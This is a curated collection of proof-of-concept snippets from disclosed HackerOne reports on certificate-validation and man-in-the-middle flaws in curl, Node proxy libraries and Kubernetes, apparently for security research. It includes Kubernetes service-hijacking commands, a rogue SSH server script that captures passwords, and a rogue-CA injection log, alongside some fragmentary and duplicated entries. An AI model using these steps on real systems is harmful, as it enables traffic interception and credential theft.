# TLS, Certificate Validation & MITM  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#2416725](https://hackerone.com/reports/2416725)  -  CVE-2024-2466: TLS certificate check bypass with mbedTLS
*medium*

```shell
$ host -t A www.example.org
www.example.org has address 93.184.216.34
$ curl https://93.184.216.34
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
        <head>
                <title>404 - Not Found</title>
        </head>
        <body>
                <h1>404 - Not Found</h1>
        </body>
</html>
```

## 2. [#3752888](https://hackerone.com/reports/3752888)  -  CVE-2026-9545: exposing HTTP/3 early data
*low*

```bash
#!/bin/bash
set -euo pipefail

export LD_LIBRARY_PATH="/src/curl-b96/build_poc/lib:/opt/quictls/lib:/opt/ngtcp2/lib:/opt/nghttp3/lib"
export PATH="/opt/ngtcp2/bin:$PATH"

tmp=$(mktemp -d)
curl_bin=/src/curl-b96/build_poc/src/curl
server=/opt/ngtcp2/bin/qtlsserver
url=https://target.example.com:4433/index.html
connect_to=target.example.com:4433:127.0.0.1:4433
secret=REQUEST_SECRET_b96a057fce65e346
server_pid=

cleanup() {
  if [ -n "${server_pid:-}" ]; then
    kill "$server_pid" >/dev/null 2>&1 || true
    wait "$server_pid" >/dev/null 2>&1 || true
  fi
  rm -rf "$tmp"
}
trap cleanup EXIT

make_certs() {
  openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
    -keyout "$tmp/ca-key.pem" -out "$tmp/ca.pem" \
    -days 1 -nodes -subj "/CN=PoC Test CA" >/dev/null 2>&1

  printf 'subjectAltName=DNS:target.example.com\n' > "$tmp/good.ext"
  openssl req -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
    -keyout "$tmp/good-key.pem" -out "$tmp/good.csr" \
    -nodes -subj "/CN=target.example.com" >/dev/null 2>&1
  openssl x509 -req -in "$tmp/good.csr" -CA "$tmp/ca.pem" -CAkey "$tmp/ca-key.pem" \
    -CAcreateserial -out "$tmp/good-cert.pem" -days 1 -extfile "$tmp/good.ext" >/dev/null 2>&1

# … truncated …
```

## 3. [#541502](https://hackerone.com/reports/541502)  -  [https-proxy-agent] Socket returned without TLS upgrade on non-200 CONNECT response, allowing request data to be sent over unencrypted connection
*medium*

```http
GET / HTTP/1.1
Host: www.google.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

## 4. [#3150884](https://hackerone.com/reports/3150884)  -  CVE-2025-4947: QUIC certificate check skip with wolfSSL
*medium*

```bash
curl -V
WARNING: this libcurl is Debug-enabled, do not use in production

curl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 wolfSSL/5.8.0 zlib/1.3.1 libidn2/2.3.8 libpsl/0.21.2 ngtcp2/1.13.0-DEV nghttp3/1.1
Release-Date: 2025-04-02
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS Debug HSTS HTTP3 HTTPS-proxy IDN IPv6 Largefile libz PSL SSL threadsafe TrackMemory UnixSockets
```

## 5. [#3694390](https://hackerone.com/reports/3694390)  -  CVE-2026-7009: OCSP stapling bypass with Apple SecTrust
*medium*

```bash
curl --version
curl 8.20.0-DEV (Darwin) libcurl/8.20.0-DEV OpenSSL/3.6.1 zlib/1.2.12 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.5 nghttp2/1.68.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt mqtts pop3 pop3s rtsp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets zstd
```

## 6. [#3694390](https://hackerone.com/reports/3694390)  -  CVE-2026-7009: OCSP stapling bypass with Apple SecTrust
*medium*

```bash
curl --version
curl 8.20.0-DEV (Darwin) libcurl/8.20.0-DEV OpenSSL/3.6.1 zlib/1.2.12 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.5 nghttp2/1.68.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AppleSecTrust AsynchDNS brotli HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets zstd
```

## 7. [#3694390](https://hackerone.com/reports/3694390)  -  CVE-2026-7009: OCSP stapling bypass with Apple SecTrust
*medium*

```bash
curl -v --cert-status --cacert ca.pem https://localhost:4433/
```

## 8. [#3694390](https://hackerone.com/reports/3694390)  -  CVE-2026-7009: OCSP stapling bypass with Apple SecTrust
*medium*

```bash
curl -v --cert-status --ca-native https://localhost:4433/
```

## 9. [#3694390](https://hackerone.com/reports/3694390)  -  CVE-2026-7009: OCSP stapling bypass with Apple SecTrust
*medium*

```bash
curl -v --ca-native https://localhost:4433/
```

## 10. [#2416725](https://hackerone.com/reports/2416725)  -  CVE-2024-2466: TLS certificate check bypass with mbedTLS
*medium*

```shell
wget https://curl.se/download/curl-8.6.0.tar.gz -O curl-8.6.0.tar.gz
wget https://github.com/Mbed-TLS/mbedtls/archive/refs/tags/v2.28.7.tar.gz -O mbedtls-2.28.7.tar.gz
tar zxf curl-8.6.0.tar.gz
tar zxf mbedtls-2.28.7.tar.gz
```

## 11. [#2416725](https://hackerone.com/reports/2416725)  -  CVE-2024-2466: TLS certificate check bypass with mbedTLS
*medium*

```shell
$ curl --version
curl 8.6.0 (x86_64-pc-linux-gnu) libcurl/8.6.0 mbedTLS/2.28.7 zlib/1.2.11 libidn2/2.2.0
Release-Date: 2024-01-31
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smb smbs smtp smtps telnet tftp
Features: alt-svc AsynchDNS HSTS HTTPS-proxy IDN IPv6 Largefile libz NTLM SSL threadsafe UnixSockets
```

## 12. [#3633146](https://hackerone.com/reports/3633146)  -  Sandbox User Can Inject Rogue CA Certificate into OS Trust Store via Sudo-Allowed deploy-certificates.sh
*medium*

```bash
python3 demo-rogue-ca.py
```

## 13. [#764986](https://hackerone.com/reports/764986)  -  Man in the middle using LoadBalancer or ExternalIPs services
*medium*

```bash
curl http://127.0.0.1:25
curl http://127.0.0.1
curl https://127.0.0.1 -k
```

## 14. [#329645](https://hackerone.com/reports/329645)  -  Silent omission of certificate hostname verification in LibreSSL and BoringSSL
*critical*

```bash
$ make SSL_BASEDIR=/path/to/libressl/2.7.0
...
./cve2018_8970_demo
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/plain
X-Frame-Options: SAMEORIGIN
x-xss-protection: 1; mode=block
X-Clacks-Overhead: GNU Terry Pratchett
Via: 1.1 varnish
Content-Length: 539
Accept-Ranges: bytes
Date: Sun, 25 Mar 2018 12:30:49 GMT
...
CVE2018-8970: Expected a hostname mismatch error
```

## 15. [#3355218](https://hackerone.com/reports/3355218)  -  CVE-2025-10966: missing SFTP host verification with wolfSSH
*low*

```bash
$ ./src/curl --version
curl 8.17.0-DEV (aarch64-apple-darwin23.3.0) libcurl/8.17.0-DEV wolfSSL/5.8.2 zlib/1.2.12 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.5 wolfssh/1.4.20 nghttp2/1.66.0 librtmp/2.3
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp sftp smb smbs smtp smtps telnet tftp ws wss
```

## 16. [#3752888](https://hackerone.com/reports/3752888)  -  CVE-2026-9545: exposing HTTP/3 early data
*low*

```bash
curl commit: f2692b54f74b8bb6058ecd3cf4abcc96e8ab36ba
curl subject: docs: note CURLOPT_PINNEDPUBLICKEY has no effect on legacy LDAP backend

curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV quictls/3.1.7 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 nghttp2/1.59.0 ngtcp2/1.8.1 nghttp3/1.6.0
Features: alt-svc AsynchDNS brotli Debug HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Largefile libz PSL SSL SSLS-EXPORT threadsafe TLS-SRP UnixSockets zstd
```

## 17. [#541502](https://hackerone.com/reports/541502)  -  [https-proxy-agent] Socket returned without TLS upgrade on non-200 CONNECT response, allowing request data to be sent over unencrypted connection
*medium*

```bash
#!/bin/bash
while true; do
  echo -e "HTTP/1.1 403 FORBIDDEN\r\n$(date)\r\n\r\n<h1>hello world from $(hostname) on $(date)</h1>" |  nc -vl 80;
done
```

## 18. [#541502](https://hackerone.com/reports/541502)  -  [https-proxy-agent] Socket returned without TLS upgrade on non-200 CONNECT response, allowing request data to be sent over unencrypted connection
*medium*

```
CONNECT www.google.com:443 HTTP/1.1
Host: www.google.com
Connection: close

GET / HTTP/1.1
Host: www.google.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
Connection: close
```

## 19. [#3752888](https://hackerone.com/reports/3752888)  -  CVE-2026-9545: exposing HTTP/3 early data
*low*

```c
/* handshake verification failed in callback, do not send anything */
  if(ctx->tls_vrfy_result) {
    result = ctx->tls_vrfy_result;
    goto denied;
  }

  (void)eos; /* use for stream EOF and block handling */
  result = cf_progress_ingress(cf, data, &pktx);
  if(result)
    goto out;

  if(!stream || stream->id < 0) {
    result = h3_stream_open(cf, data, buf, len, pnwritten);
  }
  ...
  result = Curl_bufq_write(&stream->sendbuf, buf, len, pnwritten);
  ...
  if(*pnwritten > 0 && !ctx->tls_handshake_complete && ctx->use_earlydata)
    ctx->earlydata_skip += *pnwritten;

  DEBUGASSERT(!result);
  result = cf_progress_egress(cf, data, &pktx);
```

## 20. [#541502](https://hackerone.com/reports/541502)  -  [https-proxy-agent] Socket returned without TLS upgrade on non-200 CONNECT response, allowing request data to be sent over unencrypted connection
*medium*

```
${statusCode}
```

## 21. [#1583680](https://hackerone.com/reports/1583680)  -  Undici does not use CONNECT or otherwise validate upstream HTTPS certificates when using a proxy
*high*

```
const undici = require('undici')
const dispatcher = new undici.ProxyAgent({ uri: "http://localhost:8118" })
console.log((await undici.fetch("https://self-signed.badssl.com", { dispatcher })).status);
```

## 22. [#1583680](https://hackerone.com/reports/1583680)  -  Undici does not use CONNECT or otherwise validate upstream HTTPS certificates when using a proxy
*high*

```
const undici = require('undici')
const dispatcher = new undici.ProxyAgent({ uri: "https://localhost:443" }); // HTTPS connection to server
console.log((await undici.fetch("https://example.com", { dispatcher })).status);
```

## 23. [#2410774](https://hackerone.com/reports/2410774)  -  CVE-2024-2379: QUIC certificate check bypass with wolfSSL
*low*

```
./curl -v --http3-only 'https://example.com/' -o /dev/null -s --resolve example.com:443:192.168.1.24 --curves blah
* Added example.com:443:192.168.1.24 to DNS cache
* Hostname example.com was found in DNS cache
*   Trying 192.168.1.24:443...
* wolfSSL failed to set curves
* Verified certificate just fine
* Connected to example.com (192.168.1.24) port 443
* using HTTP/3
* [HTTP/3] [0] OPENED stream for https://example.com/
* [HTTP/3] [0] [:method: GET]
* [HTTP/3] [0] [:scheme: https]
* [HTTP/3] [0] [:authority: example.com]
* [HTTP/3] [0] [:path: /]
* [HTTP/3] [0] [user-agent: curl/8.7.0-DEV]
* [HTTP/3] [0] [accept: */*]
> GET / HTTP/3
> Host: example.com
> User-Agent: curl/8.7.0-DEV
> Accept: */*
> 
* We are completely uploaded and fine
< HTTP/3 200 
< server: nginx/1.25.4
< date: Sun, 10 Mar 2024 21:02:39 GMT
< content-type: text/html
< content-length: 615
< last-modified: Wed, 14 Feb 2024 16:03:00 GMT
< etag: "65cce434-267"
< accept-ranges: bytes
< 
{ [615 bytes data]
* Connection #0 to host example.com left intact
```

## 24. [#3797526](https://hackerone.com/reports/3797526)  -  CVE-2026-12064: proto-default skips SSH verification
*low*

```
${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
```

## 25. [#3752888](https://hackerone.com/reports/3752888)  -  CVE-2026-9545: exposing HTTP/3 early data
*low*

```
${server_pid:-}
```

## 26. [#3153497](https://hackerone.com/reports/3153497)  -  CVE-2025-5025: No QUIC certificate pinning with wolfSSL
*medium*

```
# curl -V
WARNING: this libcurl is Debug-enabled, do not use in production

curl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 wolfSSL/5.8.0 zlib/1.3.1 libidn2/2.3.8 libpsl/0.21.2 ngtcp2/1.13.0-DEV nghttp3/1.1
Release-Date: 2025-04-02
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS Debug HSTS HTTP3 HTTPS-proxy IDN IPv6 Largefile libz PSL SSL threadsafe TrackMemory UnixSockets
```

## 27. [#3694390](https://hackerone.com/reports/3694390)  -  CVE-2026-7009: OCSP stapling bypass with Apple SecTrust
*medium*

```
* OpenSSL verify result: 0
* SSL certificate verified via OpenSSL.
* No OCSP response received
* closing connection #0
curl: (91) No OCSP response received
```

## 28. [#2416725](https://hackerone.com/reports/2416725)  -  CVE-2024-2466: TLS certificate check bypass with mbedTLS
*medium*

```shell
cd curl-8.6.0
export LD_LIBRARY_PATH=/usr/local/lib
export PATH=/usr/local/lib:$PATH
./configure --with-mbedtls=/usr/local --without-libpsl
make -j$(nproc) CFLAGS="-I/usr/local/include" LDFLAGS="-L/usr/local/lib"
```

## 29. [#2416725](https://hackerone.com/reports/2416725)  -  CVE-2024-2466: TLS certificate check bypass with mbedTLS
*medium*

```shell
curl: (60) SSL: no alternative certificate subject name matches target host name '93.184.216.34'
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
```

## 30. [#3633146](https://hackerone.com/reports/3633146)  -  Sandbox User Can Inject Rogue CA Certificate into OS Trust Store via Sudo-Allowed deploy-certificates.sh
*medium*

```
STEP 1: We are NOT root
  User: genesis1ptools
  UID: 992
  Can we write to /etc/pki? NO:
  touch: cannot touch '/etc/pki/ca-trust/source/anchors/test': Permission denied

STEP 3: We can run deploy-certificates.sh as ROOT (no password)
  (root) NOPASSWD: /opt/amazon/genesis1p-tools/bin/deploy-certificates.sh
  This means: we can install ANY certificate into the OS trust store

STEP 4: Generate rogue CA certificate
  Subject: CN=ATTACKER-ROGUE-CA,O=Malicious,C=XX
  CA: TRUE

STEP 5: sudo deploy-certificates.sh -- injects as root
  [INFO] Running as user: root
  [INFO] Deploying to /etc/pki/ca-trust/source/anchors/rogue-ca.pem
  [INFO] update-ca-trust completed successfully
  [INFO] SUCCESS: Certificate deployment finished

STEP 6: Rogue CA is now in the OS trust store
  -rw-r--r-- 1 root root 1139 rogue-ca.pem

STEP 7: Forge cert for ████████
  Subject: CN=████████
  Issuer:  CN=ATTACKER-ROGUE-CA,O=Malicious,C=XX
  Forged cert ACCEPTED by SSL context with rogue CA
  Signature verification: VALID -- forged cert is signed by rogue CA
```

## 31. [#541502](https://hackerone.com/reports/541502)  -  [https-proxy-agent] Socket returned without TLS upgrade on non-200 CONNECT response, allowing request data to be sent over unencrypted connection
*medium*

```javascript
if (200 == statusCode) {
  // Happy path
} else if (secureEndpoint) {
  cleanup();
  socket.destroy();
  fn(new Error(`Could not establish TLS connection. Status code: ${statusCode}`));
} else {
  // Replay on insecure endpoint
}
```

## 32. [#764986](https://hackerone.com/reports/764986)  -  Man in the middle using LoadBalancer or ExternalIPs services
*medium*

```
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: victim-client
spec:
  containers:
    - name: curl
      image: curlimages/curl:7.67.0
      command: [ "/bin/sleep", "3600" ]
EOF
```

## 33. [#764986](https://hackerone.com/reports/764986)  -  Man in the middle using LoadBalancer or ExternalIPs services
*medium*

```
# from a node
curl -sv http://1.1.1.1
curl -sv https://1.1.1.1 -k
# from the pod
kubectl exec victim-client -- curl -sv http://1.1.1.1
kubectl exec victim-client -- curl -sv https://1.1.1.1 -k
```

## 34. [#764986](https://hackerone.com/reports/764986)  -  Man in the middle using LoadBalancer or ExternalIPs services
*medium*

```
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-external-lb
  namespace: kubeproxy-mitm
spec:
  ports:
  - name: http
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
  selector:
    app: echoserver
  type: LoadBalancer
EOF
kubectl proxy --port=8080 &
sleep 3
curl -k -v -XPATCH  -H "Accept: application/json" -H "Content-Type: application/merge-patch+json" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-external-lb/status' -d '{"status":{"loadBalancer":{"ingress":[{"ip":"1.1.1.1"}]}}}'
pkill kubectl
```

## 35. [#764986](https://hackerone.com/reports/764986)  -  Man in the middle using LoadBalancer or ExternalIPs services
*medium*

```
# node -> ip
curl -sv http://1.1.1.1
curl -sv https://1.1.1.1 -k
# pod -> ip
kubectl exec victim-client -- curl -sv http://1.1.1.1
kubectl exec victim-client -- curl -sv https://1.1.1.1 -k
```

## 36. [#764986](https://hackerone.com/reports/764986)  -  Man in the middle using LoadBalancer or ExternalIPs services
*medium*

```
# node -> clusterIP
curl -sv https://10.233.36.240 -k
# pod -> clusterIP
kubectl exec victim-client -- curl -sv https://10.233.36.240 -k
```

## 37. [#764986](https://hackerone.com/reports/764986)  -  Man in the middle using LoadBalancer or ExternalIPs services
*medium*

```
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-service-lb
  namespace: kubeproxy-mitm
spec:
  ports:
  - name: https
    port: 443
    protocol: TCP
    targetPort: 8443
  selector:
    app: echoserver
  type: LoadBalancer
EOF
kubectl proxy --port=8080 &
sleep 3
curl -k -v -XPATCH  -H "Accept: application/json" -H "Content-Type: application/merge-patch+json" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-service-lb/status' -d '{"status":{"loadBalancer":{"ingress":[{"ip":"10.233.36.240"}]}}}'
pkill kubectl
```

## 38. [#764986](https://hackerone.com/reports/764986)  -  Man in the middle using LoadBalancer or ExternalIPs services
*medium*

```
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-pod-lb
  namespace: kubeproxy-mitm
spec:
  ports:
  - name: https
    port: 443
    protocol: TCP
    targetPort: 8443
  - name: https2
    port: 8443
    protocol: TCP
    targetPort: 8443
  selector:
    app: echoserver
  type: LoadBalancer
EOF
kubectl proxy --port=8080 &
sleep 3
curl -k -v -XPATCH  -H "Accept: application/json" -H "Content-Type: application/merge-patch+json" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-pod-lb/status' -d '{"status":{"loadBalancer":{"ingress":[{"ip":"10.233.115.2"}]}}}'
pkill kubectl
```

## 39. [#764986](https://hackerone.com/reports/764986)  -  Man in the middle using LoadBalancer or ExternalIPs services
*medium*

```
# node -> clusterIP
curl -sv https://10.233.36.240 -k
# pod -> clusterIP
kubectl exec victim-client -- curl -sv https://10.233.36.240 -k
# node -> endpoint
curl -sv https://10.233.115.2:8443 -k
# pod -> endpoint
kubectl exec victim-client -- curl -sv https://10.233.115.2:8443 -k
```

## 40. [#329645](https://hackerone.com/reports/329645)  -  Silent omission of certificate hostname verification in LibreSSL and BoringSSL
*critical*

```bash
$ make
...
Error connecting to server
140678245971584:error:1416F086:SSL routines:tls_process_server_certificate:certificate verify failed:ssl/statem/statem_clnt.c:1230:
X509 verify error: Hostname mismatch
```

## 41. [#3355218](https://hackerone.com/reports/3355218)  -  CVE-2025-10966: missing SFTP host verification with wolfSSH
*low*

```bash
cd /Users/$USER/scanner-repos/curl
   autoreconf -fi
   PKG_CONFIG_PATH="$HOME/.local/wolfssh/lib/pkgconfig:/opt/homebrew/lib/pkgconfig" \
   CPPFLAGS="-I$HOME/.local/wolfssh/include -I/opt/homebrew/include" \
   LDFLAGS="-L$HOME/.local/wolfssh/lib -L/opt/homebrew/lib" \
   ./configure \
     --without-libssh2 \
     --without-libssh \
     --with-wolfssh=$HOME/.local/wolfssh \
     --with-wolfssl=/opt/homebrew \
     --disable-shared
   make -j$(sysctl -n hw.ncpu)
```

## 42. [#3355218](https://hackerone.com/reports/3355218)  -  CVE-2025-10966: missing SFTP host verification with wolfSSH
*low*

```bash
./src/curl --version
   # Output includes: wolfssh/1.4.20
```

## 43. [#3355218](https://hackerone.com/reports/3355218)  -  CVE-2025-10966: missing SFTP host verification with wolfSSH
*low*

```bash
./src/curl --help ssh
   # No --ssh-knownhosts or --hostpubsha256 listed

   ./src/curl --ssh-knownhosts /tmp/kh -vvv sftp://localhost:22/
   # Error observed:
   # curl: option --ssh-knownhosts: is unknown

   ./src/curl -v --hostpubsha256 AAAA sftp://demo:password@test.rebex.net/readme.txt
   # Error observed:
   # curl: option --hostpubsha256: the installed libcurl version does not support this
```

## 44. [#2298922](https://hackerone.com/reports/2298922)  -  CVE-2024-0853: OCSP verification bypass with TLS session reuse
*low*

```
C:\curl-8.5.0_3-win64-mingw\bin>curl https://ocsptest.ddns.net/ https://ocsptest.ddns.net/ --cert-status
curl: (91) SSL certificate revocation reason: (UNKNOWN) (-1)
test
```

## 45. [#2410774](https://hackerone.com/reports/2410774)  -  CVE-2024-2379: QUIC certificate check bypass with wolfSSL
*low*

```
./curl -v --http3-only 'https://example.com/' -o /dev/null -s --resolve example.com:443:192.168.1.24 
* Added example.com:443:192.168.1.24 to DNS cache
* Hostname example.com was found in DNS cache
*   Trying 192.168.1.24:443...
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: none
* QUIC connect to 192.168.1.24 port 443 failed: SSL peer certificate or SSH remote key was not OK
* Failed to connect to example.com port 443 after 12 ms: SSL peer certificate or SSH remote key was not OK
* Closing connection
```

## 46. [#3797526](https://hackerone.com/reports/3797526)  -  CVE-2026-12064: proto-default skips SSH verification
*low*

```json
[*] Built curl:
curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.0.13 libssh2/1.11.2_DEV
Protocols: ... scp sftp ...

Rogue SSH server on 127.0.0.1:46363
Real fingerprint: SHA256:sBclp/HMFOJgNTOMMo5kDDg4bXCXVGcjStynZwsyiy4
Wrong pin:        SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[explicit sftp://] exit=60
  stderr: curl: (60) Denied establishing ssh session: mismatch SHA256 fingerprint. Remote sBclp/HMFOJgNTOMMo5kDDg4bXCXVGcjStynZwsyiy4= is not equal to SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  creds captured: <none>

[--proto-default sftp] exit=67
  stderr: curl: (67) Authentication failure
  creds captured: ['victim:Secret123']

--- RESULT ---
VULNERABLE: --proto-default sftp bypassed host key pin
  Password sent to rogue server: ['victim:Secret123']
```

## 47. [#3752888](https://hackerone.com/reports/3752888)  -  CVE-2026-9545: exposing HTTP/3 early data
*low*

```
http: stream 0x0 [authorization: Bearer REQUEST_SECRET_b96a057fce65e346]
curl: (60) SSL: no alternative certificate subject name matches target hostname 'target.example.com'
TEST_RESULT request_seen=yes verify_failed=yes curl_exit=60
```

## 48. [#2208860](https://hackerone.com/reports/2208860)  -  Integrity checks according to policies can be circumvented in Node.js 20 and Node.js 18
*medium, $1,270*

```js
$ node --experimental-policy=policy.json main.js 
3224
```

## 49. [#764986](https://hackerone.com/reports/764986)  -  Man in the middle using LoadBalancer or ExternalIPs services
*medium*

```
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-local-lb
  namespace: kubeproxy-mitm
spec:
  ports:
  - name: smtp
    port: 25
    protocol: TCP
    targetPort: 8080
  - name: http
    port: 80
    protocol: TCP
    targetPort: 8080
  - name: https
    port: 443
    protocol: TCP
    targetPort: 8443
  selector:
    app: echoserver
  type: LoadBalancer
EOF
kubectl proxy --port=8080 &
sleep 3
curl -k -v -XPATCH  -H "Accept: application/json" -H "Content-Type: application/merge-patch+json" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-local-lb/status' -d '{"status":{"loadBalancer":{"ingress":[{"ip":"127.0.0.1"}]}}}'
pkill kubectl
```

## 50. [#3797526](https://hackerone.com/reports/3797526)  -  CVE-2026-12064: proto-default skips SSH verification
*low*

```bash
#!/usr/bin/env bash
# Run from the curl source root: ~/curl/curl
# The local build at ./build-ssh/src/curl must have SFTP support (libssh2).
set -e

CURL_BIN="./build-ssh/src/curl"
export LD_LIBRARY_PATH="/tmp/libssh2-install/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"

echo "[*] Using: $CURL_BIN"
"$CURL_BIN" --version | head -2
if ! "$CURL_BIN" --version | grep -q sftp; then
  echo "FATAL: $CURL_BIN does not have SFTP support."; exit 1
fi
echo ""

python3 - "$CURL_BIN" <<'PYEOF'
import os, sys, socket, threading, time, subprocess

CURL_BIN = sys.argv[1]

import paramiko
host_key = paramiko.RSAKey.generate(2048)
host_fp_sha256 = "SHA256:" + __import__("base64").b64encode(
    __import__("hashlib").sha256(host_key.asbytes()).digest()
).decode().rstrip("=")

WRONG_PIN = "SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
captured_creds = []

class RogueServer(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        captured_creds.append(f"{username}:{password}")
        return paramiko.AUTH_FAILED
    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
# … truncated …
```

## 51. [#2416725](https://hackerone.com/reports/2416725)  -  CVE-2024-2466: TLS certificate check bypass with mbedTLS
*medium*

```c
if(connssl->peer.sni) {
    if(mbedtls_ssl_set_hostname(&backend->ssl, connssl->peer.sni)) {
      /* mbedtls_ssl_set_hostname() sets the name to use in CN/SAN checks and
         the name to set in the SNI extension. So even if curl connects to a
         host specified as an IP address, this function must be used. */
      failf(data, "Failed to set SNI");
      return CURLE_SSL_CONNECT_ERROR;
    }
  }
```

## 52. [#2416725](https://hackerone.com/reports/2416725)  -  CVE-2024-2466: TLS certificate check bypass with mbedTLS
*medium*

```diff
-  if(!Curl_inet_pton(AF_INET, conn->host.name, &addr) &&
-#ifdef ENABLE_IPV6
-     !Curl_inet_pton(AF_INET6, conn->host.name, &addr) &&
-#endif
-     sni && mbedtls_ssl_set_hostname(&connssl->ssl, conn->host.name)) {
-    infof(data, "WARNING: failed to configure "
-          "server name indication (SNI) TLS extension\n");
+  if(mbedtls_ssl_set_hostname(&connssl->ssl, conn->host.name)) {
+    /* mbedtls_ssl_set_hostname() sets the name to use in CN/SAN checks *and*
+       the name to set in the SNI extension. So even if curl connects to a
+       host specified as an IP address, this function must be used. */
+    failf(data, "couldn't set hostname in mbedTLS");
+    return CURLE_SSL_CONNECT_ERROR;
```

## 53. [#2416725](https://hackerone.com/reports/2416725)  -  CVE-2024-2466: TLS certificate check bypass with mbedTLS
*medium*

```diff
-  if(mbedtls_ssl_set_hostname(&backend->ssl, hostname)) {
-    /* mbedtls_ssl_set_hostname() sets the name to use in CN/SAN checks *and*
-       the name to set in the SNI extension. So even if curl connects to a
-       host specified as an IP address, this function must be used. */
-    failf(data, "couldn't set hostname in mbedTLS");
-    return CURLE_SSL_CONNECT_ERROR;
+  {
+    char *snihost = Curl_ssl_snihost(data, hostname, NULL);
+    if(!snihost || mbedtls_ssl_set_hostname(&backend->ssl, snihost)) {
+      /* mbedtls_ssl_set_hostname() sets the name to use in CN/SAN checks and
+         the name to set in the SNI extension. So even if curl connects to a
+         host specified as an IP address, this function must be used. */
+      failf(data, "Failed to set SNI");
+      return CURLE_SSL_CONNECT_ERROR;
+    }
```

## 54. [#2416725](https://hackerone.com/reports/2416725)  -  CVE-2024-2466: TLS certificate check bypass with mbedTLS
*medium*

```diff
-  {
-    char *snihost = Curl_ssl_snihost(data, hostname, NULL);
-    if(!snihost || mbedtls_ssl_set_hostname(&backend->ssl, snihost)) {
+
+  if(connssl->peer.sni) {
+    if(mbedtls_ssl_set_hostname(&backend->ssl, connssl->peer.sni)) {
       /* mbedtls_ssl_set_hostname() sets the name to use in CN/SAN checks and
          the name to set in the SNI extension. So even if curl connects to a
          host specified as an IP address, this function must be used. */
```
